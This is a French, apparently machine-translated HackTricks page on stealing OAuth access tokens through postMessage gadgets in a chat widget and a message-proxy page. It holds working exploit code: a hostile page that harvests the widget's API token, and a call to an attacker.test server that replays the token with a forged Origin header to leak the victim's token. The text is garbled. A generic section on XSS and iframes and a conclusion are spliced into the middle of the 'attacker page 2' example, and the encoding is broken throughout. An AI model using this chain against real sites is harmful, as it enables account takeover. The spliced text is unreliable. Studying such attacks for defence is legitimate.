Le dernier exemple √©tait bas√© sur un chat-widget pr√©sent sur toutes les pages d'un site web, m√™me les pages d'erreur. Il y avait plusieurs √©couteurs postMessage, dont l'un sans v√©rification d'origine appropri√©e qui ne vous permettait que de d√©marrer la fen√™tre de chat. Un autre √©couteur avait une v√©rification d'origine stricte pour que le chat-widget re√ßoive un appel d'initialisation et le jeton d'API de chat actuel qui √©tait utilis√© pour l'utilisateur actuel.
```html
<iframe src="https://chat-widget.example.com/chat"></iframe>
<script>
window.addEventListener('message', function(e) {
  if (e.data.type === 'launch-chat') {
    openChat();
  }
});

function openChat() {
  ...
}

var chatApiToken;
window.addEventListener('message', function(e) {
  if (e.origin === 'https://chat-widget.example.com') {
    if (e.data.type === 'chat-widget') {
      if (e.data.key === 'api-token') {
        chatApiToken = e.data.value;
      }
      if(e.data.key === 'init') {
        chatIsLoaded();
      }
    }
  }
});

function chatIsLoaded() {
  ...
}
</script>
```
Lorsque l'iframe de chat est charg√©e :

1. Si un jeton d'API de chat existait dans le localStorage du widget de chat, il enverrait le jeton d'API √† son parent en utilisant postMessage. S'il n'y avait pas de jeton d'API de chat, il ne ferait rien.
2. Lorsque l'iframe est charg√©e, elle envoie un postMessage avec `{"type": "chat-widget", "key": "init"}` √† son parent.

Si vous avez cliqu√© sur l'ic√¥ne de chat dans la fen√™tre principale :

1. Si aucun jeton d'API de chat n'avait √©t√© envoy√© auparavant, le widget de chat en cr√©erait un et le mettrait dans le localStorage de son propre domaine et le postMessage √† la fen√™tre parent.
2. La fen√™tre parent ferait alors un appel API au service de chat. Le point de terminaison de l'API √©tait restreint par CORS au site Web sp√©cifique configur√© pour le service. Vous deviez fournir un en-t√™te `Origin` valide pour l'appel API avec le jeton d'API de chat pour permettre l'envoi de la demande.
3. L'appel API de la fen√™tre principale contiendrait `location.href` et l'enregistrerait en tant que "page actuelle" du visiteur avec le jeton d'API de chat. La r√©ponse contiendrait ensuite des jetons pour se connecter √† un websocket pour initier la session de chat :

    ```json
    {
      "api_data": {
        "current_page": "https://example.com/#access_token=test",
        "socket_key": "xxxyyyzzz",
        ...
      }
    }
    ```

Dans cet exemple, j'ai r√©alis√© que l'annonce du jeton d'API de chat serait toujours annonc√©e au parent de l'iframe du widget de chat, et si j'obtenais le jeton d'API de chat, je pourrais simplement faire une demande c√¥t√© serveur en utilisant le jeton, puis ajouter mon propre en-t√™te `Origin` artificiel √† l'appel API car un en-t√™te CORS ne concerne que le navigateur. Cela a donn√© la cha√Æne suivante :

1. J'ai cr√©√© une page malveillante qui int√®gre une iframe du widget de chat, ajout√© un √©couteur postMessage pour √©couter le jeton d'API de chat. De plus, j'ai d√©clench√© un √©v√©nement pour recharger l'iframe si je n'avais pas obtenu le jeton d'API en 2 secondes. C'√©tait pour m'assurer que je prenais √©galement en charge les victimes qui n'avaient jamais initi√© le chat, et comme je pouvais d√©clencher l'ouverture du chat √† distance, j'avais d'abord besoin du jeton d'API de chat pour commencer √† interroger les donn√©es dans l'API de chat c√¥t√© serveur.

    ```html
    <div id="leak"><iframe
    id="i" name="i"
    src="https://chat-widget.example.com/chat" onload="reloadToCheck()"></iframe></div>
    <script>
    var gotToken = false;
    function reloadToCheck() {
      if (gotToken) return;
      setTimeout(function() {
        document.getElementById('i').src = 'https://chat-widget.example.com/chat?' + Math.random();
      }, 2000);
    }
    window.onmessage = function(e) {
      if (e.data.key === 'api-token') {
        gotToken = true;
        lookInApi(e.data.value);    
      }
    }
    launchChatWindowByPostMessage();
    </script>
    ```
2. J'ai ajout√© un lien vers la page malveillante pour ouvrir le flux de connexion qui finirait sur la page avec le widget de chat avec le jeton dans l'URL :

    ```
    <a href="#" onclick="b=window.open('https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...');">Cliquez ici pour pirater le jeton</a>
    ```
3. La fonction `launchChatWindowByPostMessage()` enverra continuellement un postMessage √† la fen√™tre principale, si elle est ouverte, pour lancer le widget de chat :

    ```javascript
    function launchChatWindowByPostMessage() {
      var launch = setInterval(function() {
        if(b) { b.postMessage({type: 'launch-chat'}, '*'); }
      }, 500);
    }
    ```
4. Lorsque la victime a cliqu√© sur le lien et a atterri sur la page d'erreur, le chat se lancerait et un jeton d'API de chat serait cr√©√©. Mon rechargement de l'iframe du widget de chat sur la page malveillante obtiendrait le `api-token` via postMessage et je pourrais alors commencer √† chercher dans l'API l'URL actuelle de la victime :

    ```javascript
    function lookInApi(token) {
      var look = setInterval(function() {
        fetch('https://fetch-server-side.attacker.test/?token=' + token).then(e => e.json()).then(e => {
          if (e &&
            e.api_data &&
            e.api_data.current_url &&
            e.api_data.current_url.indexOf('access_token') !== -1) {
              var payload = e.api_data.current_url
              document.getElementById('leak').innerHTML = 'L\'attaquant a maintenant le jeton : ' + payload;
              clearInterval(look);
          }
        });
      }, 2000);
    }
    ```
5. La page c√¥t√© serveur √† `https://fetch-server-side.attacker.test/?token=xxx` ferait l'appel API avec l'en-t√™te Origin ajout√© pour faire croire √† l'API de chat que je l'utilisais en tant qu'origine l√©gitime :

    ```javascript
    addEventListener('fetch', event => {
      event.respondWith(handleRequest(event.request))
    })
    async function getDataFromChatApi(token) {
      return await fetch('https://chat-widget.example.com/api', {headers:{Origin: 'https://example.com', 'Chat-Api-Token': token}});
    }
    function handleRequest(request) {
      const token = request.url.match('token=([^&#]+)')[1] || null;
      return token ? getDataFromChatApi(token) : null;
    }
    ```
6. Lorsque la victime a cliqu√© sur le lien et a effectu√© la danse OAuth et a atterri sur la page d'erreur avec le jeton ajout√©, le widget de chat se serait soudainement ouvert, enregistrerait l'URL actuelle et l'attaquant aurait le jeton d'acc√®s de la victime.

## Autres id√©es pour la fuite d'URL

Il existe encore d'autres types de gadgets diff√©rents qui attendent d'√™tre d√©couverts. Voici l'un de ces cas que je n'ai pas pu trouver dans la nature mais qui pourrait √™tre un moyen potentiel de faire fuiter l'URL en utilisant l'un des modes de r√©ponse disponibles.

### Une page sur un domaine qui achemine tout postMessage vers son ouvreur

Comme tous les types de r√©ponse `web_message` ne peuvent pas valider le chemin de l'origine, n'importe quelle URL sur un domaine valide peut recevoir le postMessage avec le jeton. S'il y a une forme de proxy d'√©couteur postMessage sur l'une des pages du domaine, qui prend n'importe quel message envoy√© et envoie tout √† son `opener`, je peux faire une double cha√Æne window.open :

Page de l'attaquant 1 :
```html
<a href="#" onclick="a=window.open('attacker2.html'); return false;">Accept cookies</a>
```
# Page de l'attaquant 2:

## XSS et iframes pour voler des valeurs d'√©tat et de code

Une autre technique pour voler des valeurs d'√©tat et de code consiste √† utiliser des attaques XSS et des iframes. Cette technique est similaire √† l'utilisation de postMessage, mais elle est plus simple √† mettre en ≈ìuvre.

L'attaquant peut cr√©er une page Web malveillante contenant du code JavaScript qui extrait les valeurs d'√©tat et de code de la page de l'utilisateur. Cette page peut √™tre h√©berg√©e sur un serveur contr√¥l√© par l'attaquant ou sur un service tiers.

L'attaquant peut ensuite utiliser une attaque XSS pour injecter cette page malveillante dans la page de l'utilisateur. L'attaquant peut utiliser diff√©rentes techniques pour injecter la page malveillante, telles que l'injection de code JavaScript dans les champs de saisie de la page ou l'injection de code JavaScript dans les URL.

Une fois que la page malveillante est inject√©e dans la page de l'utilisateur, elle peut extraire les valeurs d'√©tat et de code de la page de l'utilisateur et les envoyer √† l'attaquant. L'attaquant peut utiliser ces valeurs pour effectuer une attaque de prise de contr√¥le de compte.

L'utilisation d'iframes est similaire √† l'utilisation de l'attaque XSS. L'attaquant peut cr√©er une page Web malveillante contenant un iframe qui charge la page de l'utilisateur. L'iframe peut √™tre h√©berg√© sur un serveur contr√¥l√© par l'attaquant ou sur un service tiers.

L'attaquant peut ensuite utiliser une attaque XSS pour injecter cet iframe dans la page de l'utilisateur. L'iframe peut extraire les valeurs d'√©tat et de code de la page de l'utilisateur et les envoyer √† l'attaquant.

## Conclusion

Les attaques OAuth sont de plus en plus courantes, car de plus en plus d'applications utilisent OAuth pour l'authentification et l'autorisation. Les attaquants peuvent utiliser diff√©rentes techniques pour effectuer une attaque de prise de contr√¥le de compte, telles que l'utilisation de postMessage, d'iframes et d'attaques XSS.

Les d√©veloppeurs doivent √™tre conscients de ces techniques et mettre en place des mesures de s√©curit√© pour prot√©ger leurs applications contre ces attaques. Les mesures de s√©curit√© peuvent inclure la validation des valeurs d'√©tat et de code, la mise en place de restrictions de domaine pour les messages post√©s et l'utilisation de CSP pour limiter les sources de scripts autoris√©es.
```html
<a href="#" onclick="b=window.open('https://accounts.google.com/oauth/...?', '', 'x'); location.href = 'https://example.com/postmessage-proxy'; return false;">Login to google</a>
```
Et le `https://example.com/postmessage-proxy` aurait quelque chose comme:
```javascript
// Proxy all my messages to my opener:
window.onmessage=function(e) { opener.postMessage(e.data, '*'); }
```
Je pourrais utiliser n'importe lequel des modes de r√©ponse `web_message` pour soumettre le jeton provenant du fournisseur OAuth jusqu'√† l'origine valide de `https://example.com`, mais le point final enverrait le jeton plus loin vers `opener`, qui est la page de l'attaquant.

Ce flux peut sembler improbable et n√©cessite deux clics : un pour cr√©er une relation d'ouverture entre l'attaquant et le site web, et le second pour lancer le flux OAuth en ayant le site l√©gitime comme ouvreur de la fen√™tre OAuth.

Le fournisseur OAuth envoie le jeton jusqu'√† l'origine l√©gitime :

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget4-example1.png)

Et l'origine l√©gitime a le proxy postMessage vers son ouvreur :

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget4-example2.png)

Ce qui permet √† l'attaquant d'obtenir le jeton :

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget4-example3.png)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
